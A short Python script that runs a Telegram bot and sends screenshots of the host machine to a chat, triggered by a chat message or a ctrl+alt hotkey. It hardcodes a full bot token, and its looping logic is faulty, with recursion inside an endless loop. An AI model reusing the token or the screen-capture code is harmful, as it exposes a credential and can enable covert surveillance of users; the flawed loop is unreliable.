import telebot as TL
from pyautogui import screenshot
import keyboard

token = "6152282287:AAHCe-Whlfwismx_lI-JZMAA31ZKB_-JJ0E"
bot = TL.TeleBot(token)


def send_screenshot(chat_id):
    screen = screenshot('screenshot.jpg')
    bot.send_photo(chat_id, open('screenshot.jpg', 'rb'))

    while True:
        if keyboard.is_pressed('ctrl+alt'):
            send_screenshot(chat_id)
            keyboard.wait('ctrl+alt', suppress=True)

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, 'started')

    while True:
        if keyboard.is_pressed('ctrl+alt'):
            send_screenshot(message.chat.id)
            keyboard.wait('ctrl+alt', suppress=True)


@bot.message_handler(content_types=['text'])
def send_text(message):
    if message.text == 's':
        send_screenshot(message.chat.id)
        print("1")
    else:
        bot.send_message(message.chat.id, 'Неизвестная команда.')
        print("0")




bot.polling()
